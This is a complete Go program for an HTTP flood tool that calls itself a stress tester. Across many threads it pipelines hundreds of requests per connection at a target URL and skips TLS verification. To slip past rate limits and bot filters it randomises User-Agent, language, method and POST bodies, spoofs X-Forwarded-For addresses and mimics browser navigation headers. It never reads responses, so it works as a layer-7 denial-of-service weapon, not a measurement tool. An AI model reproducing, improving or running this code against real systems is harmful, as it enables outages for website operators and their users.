package main

import (
    "bytes"
    "crypto/tls"
    "fmt"
    "math/rand"
    "net"
    "net/url"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
)

// Global state for DNS IPs
var (
    ips      []string
    ipsMutex sync.Mutex

    httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
    languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
    contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

// StressConfig holds command-line configuration
type StressConfig struct {
    Target     *url.URL
    Threads    int
    Duration   time.Duration
    CustomHost string
    Port       int
    Path       string
}

func init() {
    // Seed the random generator for unique requests
    rand.Seed(time.Now().UnixNano())
}

func main() {
    if len(os.Args) < 4 {
        fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
        os.Exit(1)
    }

    rawURL := os.Args[1]
    threads, _ := strconv.Atoi(os.Args[2])
    durSec, _ := strconv.Atoi(os.Args[3])
    custom := ""
    if len(os.Args) > 4 {
        custom = os.Args[4]
    }

    parsed, err := url.Parse(rawURL)
    if err != nil {
        fmt.Println("Invalid URL:", err)
        os.Exit(1)
    }

    port := determinePort(parsed)
    path := parsed.RequestURI() // includes path + query

    cfg := StressConfig{
        Target:     parsed,
        Threads:    threads,
        Duration:   time.Duration(durSec) * time.Second,
        CustomHost: custom,
        Port:       port,
        Path:       path,
    }

    // Initial DNS
    addrs, err := lookupIPv4(parsed.Hostname())
    if err != nil {
        fmt.Printf("DNS lookup failed: %v\n", err)
        os.Exit(1)
    }
    updateIPs(addrs)
    fmt.Printf("Resolved IPs: %v\n", addrs)

    // Periodic DNS refresh
    go dnsRefresh(parsed.Hostname(), 30*time.Second)

    fmt.Printf("Starting stress test: %s via %s, threads=%d, duration=%v\n",
        rawURL, path, threads, cfg.Duration)
    runWorkers(cfg)
    fmt.Println("Stress test completed.")
}

// determinePort extracts port from URL or defaults to 80/443
func determinePort(u *url.URL) int {
    if p := u.Port(); p != "" {
        if pi, err := strconv.Atoi(p); err == nil {
            return pi
        }
    }
    if strings.EqualFold(u.Scheme, "https") {
        return 443
    }
    return 80
}

// lookupIPv4 resolves A records to IPv4 strings
func lookupIPv4(host string) ([]string, error) {
    addrs, err := net.LookupIP(host)
    if err != nil {
        return nil, err
    }
    var out []string
    for _, a := range addrs {
        if ip4 := a.To4(); ip4 != nil {
            out = append(out, ip4.String())
        }
    }
    if len(out) == 0 {
        return nil, fmt.Errorf("no IPv4 for %s", host)
    }
    return out, nil
}

// dnsRefresh periodically re-resolves DNS entries
func dnsRefresh(host string, interval time.Duration) {
    ticker := time.NewTicker(interval)
    defer ticker.Stop()
    for range ticker.C {
        if addrs, err := lookupIPv4(host); err == nil {
            updateIPs(addrs)
            fmt.Printf("Re-resolved IPs: %v\n", addrs)
        } else {
            fmt.Printf("DNS refresh error: %v\n", err)
        }
    }
}

// updateIPs safely replaces global IP list
func updateIPs(newList []string) {
    ipsMutex.Lock()
    ips = newList
    ipsMutex.Unlock()
}

// pickRandomIP returns one IP from the pool
func pickRandomIP() string {
    ipsMutex.Lock()
    defer ipsMutex.Unlock()
    return ips[rand.Intn(len(ips))]
}

// runWorkers spawns threads to send bursts until duration elapses
func runWorkers(cfg StressConfig) {
    var wg sync.WaitGroup
    stopCh := time.After(cfg.Duration)

    for i := 0; i < cfg.Threads; i++ {
        wg.Add(1)
        go func(id int) {
            defer wg.Done()
            ticker := time.NewTicker(60 * time.Millisecond)
            defer ticker.Stop()

            tlsCfg := &tls.Config{
                ServerName:         cfg.Target.Hostname(),
                InsecureSkipVerify: true,
            }

            for {
                select {
                case <-stopCh:
                    return
                case <-ticker.C:
                    sendBurst(cfg, tlsCfg)
                }
            }
        }(i)
    }
    wg.Wait()
}

// sendBurst opens a connection and sends ~500 requests back-to-back
func sendBurst(cfg StressConfig, tlsCfg *tls.Config) {
    ipAddr := pickRandomIP()
    address := fmt.Sprintf("%s:%d", ipAddr, cfg.Port)

    conn, err := dialConn(address, tlsCfg)
    if err != nil {
        fmt.Printf("[dial error] %v\n", err)
        return
    }
    defer conn.Close()

    method := httpMethods[rand.Intn(len(httpMethods))]

    for i := 0; i < 250; i++ {
        header, body := buildRequest(cfg, method)
        if _, err := conn.Write([]byte(header)); err != nil {
            fmt.Printf("[write header] %v\n", err)
            return
        }
        if method == "POST" {
            if _, err := conn.Write(body); err != nil {
                fmt.Printf("[write body] %v\n", err)
                return
            }
        }
    }
}

// dialConn chooses TCP or TLS based on port
func dialConn(addr string, tlsCfg *tls.Config) (net.Conn, error) {
    if tlsCfg != nil && strings.HasSuffix(addr, ":443") {
        return tls.Dial("tcp", addr, tlsCfg)
    }
    return net.Dial("tcp", addr)
}

// buildRequest constructs HTTP request string and body
func buildRequest(cfg StressConfig, method string) (string, []byte) {
    var buf bytes.Buffer
    hostHdr := cfg.Target.Hostname()
    if cfg.CustomHost != "" {
        hostHdr = cfg.CustomHost
    }

    // Request line + Host
    fmt.Fprintf(&buf, "%s %s HTTP/1.1\r\nHost: %s:%d\r\n", method, cfg.Path, hostHdr, cfg.Port)

    // Common randomized headers
    writeCommonHeaders(&buf)

    // If POST, add content headers and body
    var body []byte
    if method == "POST" {
        contentType := contentTypes[rand.Intn(len(contentTypes))]
        body = createBody(contentType)
        fmt.Fprintf(&buf, "Content-Type: %s\r\n", contentType)
        fmt.Fprintf(&buf, "Content-Length: %d\r\n", len(body))
    }

    // Final connection header
    buf.WriteString("Referer: https://")
    buf.WriteString(hostHdr)
    buf.WriteString("/\r\nConnection: keep-alive\r\n\r\n")

    return buf.String(), body
}

// writeCommonHeaders adds headers with randomness
func writeCommonHeaders(buf *bytes.Buffer) {
    buf.WriteString("User-Agent: ")
    buf.WriteString(randomUserAgent())
    buf.WriteString("\r\nAccept-Language: ")
    buf.WriteString(languages[rand.Intn(len(languages))])
    
    // Static headers written in a single call
    buf.WriteString("\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
        "Accept-Encoding: gzip, deflate, br, zstd\r\n" +
        "Sec-Fetch-Site: none\r\n" +
        "Sec-Fetch-Mode: navigate\r\n" +
        "Sec-Fetch-User: ?1\r\n" +
        "Sec-Fetch-Dest: document\r\n" +
        "Upgrade-Insecure-Requests: 1\r\n" +
        "Cache-Control: no-cache\r\nX-Forwarded-For: ")

    // Generate the IP in one efficient call
    fmt.Fprintf(buf, "%d.%d.%d.%d\r\n",
        rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

// createBody builds a random POST payload based on content-type
func createBody(contentType string) []byte {
    var b bytes.Buffer
    switch contentType {
    case "application/x-www-form-urlencoded":
        vals := url.Values{}
        for i := 0; i < 3; i++ {
            vals.Set(randomString(5), randomString(8))
        }
        b.WriteString(vals.Encode())
    case "application/json":
        b.WriteByte('{')
        for i := 0; i < 3; i++ {
            if i > 0 {
                b.WriteByte(',')
            }
            fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
        }
        b.WriteByte('}')
    case "text/plain":
        b.WriteString("text_" + randomString(12))
    }
    return b.Bytes()
}

// randomString generates an alphanumeric string of length n
func randomString(n int) string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

// randomUserAgent builds a semi-random UA string
func randomUserAgent() string {
    browsers := []string{"Chrome", "Firefox", "Safari", "Edg"}
    osList := []string{
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "X11; Linux x86_64",
    }
    br := browsers[rand.Intn(len(browsers))]
    os := osList[rand.Intn(len(osList))]
    ver := fmt.Sprintf("%d.0.%d", rand.Intn(90)+10, rand.Intn(9999))
    return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s", os, br, ver)
}
